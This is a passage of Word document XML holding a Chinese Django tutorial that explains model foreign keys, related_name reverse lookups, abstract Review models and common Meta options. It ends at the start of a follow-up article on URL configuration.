          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># instead of using restaurant.dish_set.all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503AFD72" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    restaurant = models.ForeignKey(Restaurant, null=True, related_name='dishes', on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EEF9C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="039386E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149881FF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6BA805" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13C9BBDA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># This Abstract Review can be used to create RestaurantReview and DishReview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35953F4F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60DC5BF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Review(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618E3E53" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    RATING_CHOICES = ((1, 'one'), (2, 'two'), (3, 'three'), (4, 'four'), (5, 'five'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F9E35F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    rating = models.PositiveSmallIntegerField('Rating', blank=False, default=3, choices=RATING_CHOICES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AFE48A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    comment = models.TextField(blank=True, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B01E74" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.ForeignKey(User, default=1, on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEB4A93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    date = models.DateField(default=date.today)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC80B2A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51D5FCC0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69CDD04A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        abstract = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D391A9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59085EC0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class RestaurantReview(Review):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6209F307" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    restaurant = models.ForeignKey(Restaurant, on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22908B97" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B6C7B6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDE24CB" w14:textId="1E47DB5A" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return "{} review".format(self.restaurant.name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04365192" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32E40F01" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你观察到Django模型设计里的细节了吗?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72205F58" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EF6A5D5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们的Dish模型里有一个restaurant的字段，建立了一个单对多的关系。我们可以通过dish.restaurant.name直接查询到菜肴所属的餐厅的名字。然而我们Restaurant模型里并没有dish的字段，我们如何根据restaurant查询到某个餐厅的所有菜肴呢？Django非常聪明，可以通过在dish</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>小写后面加上'_set'进行反向查询。我们本来可以直接通过restaurant.dish_set.all的方法来进行查找的，然而这个方法并不直观。为了解决这个问题，我们在dish模型里设置'related_name = dishes", 这样我们就可以直接通过restaurant.dishes.all来反向查询所有菜肴了。注意一但你设置了related name, 你将不能再通过_set方法来反向查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3744C7C1" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64AFF5C0" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>restaurant = models.ForeignKey(Restaurant, related_name='dishes', on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D73C142" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CC9DA24" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第2个细节你需要关注的是Review模型里，我们设置了META选项: Abstract = True。这样一来Django就会认为这个模型是抽象类，而不会在数据库里创建review的数据表。实际上Model自带的META选项还有很多，都非常有用。见下文。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C276C4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D52EF08" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>常见的Django Model META类选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A8D7BB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3568E1E6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AEFA8A"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django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACE4CA3" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="175ECE27" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1765D7"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 按Priority降序, order_date升序排列.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAAC15F"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get_latest_by = ['-priority', 'order_date']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C9324E"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 自定义数据库里表格的名字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619B972D"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db_table = 'music_album'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29038612"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 按什么排序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073B2986"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ordering = ['pub_date']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B4AA03"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 定义APP的标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EAEEA3"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app_label = 'myapp'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D1A9E0"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 声明此类是否为抽象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6EB4DE"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abstract = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1D6EDB"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 添加授权</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7332A8F6"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permissions = (("can_deliver_pizzas", "Can deliver pizzas"),)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7988EAA9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A88B5EA" w14:textId="1DD2D836" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>未完待续。Django自带的models里有两个非常重要的类，一个是models.Model, 另一个是models.Manager。下次我们将介绍models.Manager类是什么东东以及如何使用它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6117B32A" w14:textId="48C8BF71" w:rsidR="001C47AF" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">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011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId234" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础核心技术介绍(2): URL的设计与配置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4689D706" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础核心技术介绍(2): URL的设计与配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310AE343" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 Yunbo Shi </w:t>
      </w:r>
      <w:hyperlink r:id="rId235" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-09</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BD5244" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F09B4C6" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7268E100" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网络应用开发的</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5项基础核心技术</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>包括</w:t>
      </w:r>
      <w:hyperlink r:id="rId236" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>模型（Model）的设计</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
